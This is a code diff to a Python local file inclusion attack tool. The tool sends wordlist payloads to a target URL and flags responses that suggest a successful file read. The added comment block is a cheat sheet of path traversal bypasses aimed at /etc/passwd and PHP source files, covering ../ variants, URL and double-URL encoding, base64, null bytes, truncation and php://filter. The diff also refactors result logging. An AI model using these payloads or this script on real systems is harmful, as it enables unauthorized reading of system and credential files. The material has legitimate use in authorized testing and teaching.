@@ -1,3 +1,22 @@
+# options to make
+# 1. absolute path                                                                                              DONE
+# dir traversal with ../../../                                                                                  DONE     
+# dir traversal but starts with /../../../ to go arount filename prefixes                                       DONE 
+# use alternative traversals for nonrecursive ../ detection:
+#   ....//, ..././, ....\/, ....////                                                                            DONE
+# use double //: ..//..//..//                                                                                   DONE
+# use urlencoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                                                      DONE
+# use double urlencoding: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd                           DONE
+# -- use base64 encoding: Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==                                                      DONE 
+# -- use double base64 encoding: TGk0dkxpNHZMaTR2TGk0dlpYUmpMM0JoYzNOM1pBPT0=                                   DONE 
+# start the string off with valid path: ./languages/../../../../etc/passwd                                      HOW????????
+# start the string off with invalid path: a/../../../etc/passwd                                                 DONE 
+# -- OLD php string truncation: ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
+# nullbytes with /etc/passwd%00                                                                                 DONE
+# read source code php://filter/read=convert.base64-encode/resource=config                                      NEED TO TRY LOTTA FILENAMES
+# try \ instead of /                                                                                            DONE
+# php filters                                                                                                   FAT
+
 # used https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 # and https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
 
@@ -228,17 +247,17 @@ def checkLFI(response):
     else:
         return getTextLen(response.text) != responseType[1]
 
-def printIfLFI(payloadLine, response, writeToFile):
+def printIfLFI(payloadLine, response, writeToFile, file = None):
         tlen = getTextLen(response.text)
         isLFI = checkLFI(response)
-        file = open("out/attackResults.txt", "w+")
         if isLFI:
             out1 = f"Status: " + (f"{bcolors.OKGREEN}" if str(response.status_code)[0] == "2" else f"{bcolors.FAIL}") + f"{response.status_code}{bcolors.ENDC}"
             out1 += f"\tSize: {tlen}\t"
             out1 += "Payload: " + (payloadLine if len(payloadLine) < 100 else payloadLine[:100] + "{...}")
             print(out1)
             out2 = f"Status: {response.status_code}\tSize: {tlen}\tPayload: {payloadLine}\n"
-            file.write(out2)
+            if writeToFile:
+                file.write(out2)
         else:
             print(f"{bcolors.FAIL}Status: {response.status_code}\tSize: {tlen}\tPayload: {payloadLine}{bcolors.ENDC}")
 
@@ -246,10 +265,11 @@ def attack(url, payload, writeToFile = True):
     print(f'{bcolors.OKBLUE}Attacking the server..{bcolors.ENDC}')
     checkResponseType(url)
     
+    resultsFile = open("out/attackResults.txt", "w+") if writeToFile else None
     for i in range(len(payload)):
         r = requests.get(url + payload[i])
         deleteLastLine()
-        printIfLFI(payload[i], r, writeToFile)
+        printIfLFI(payload[i], r, writeToFile, resultsFile)
         print(f"{bcolors.BOLD}[{i}/{len(payload)}]{bcolors.ENDC}")
 
 
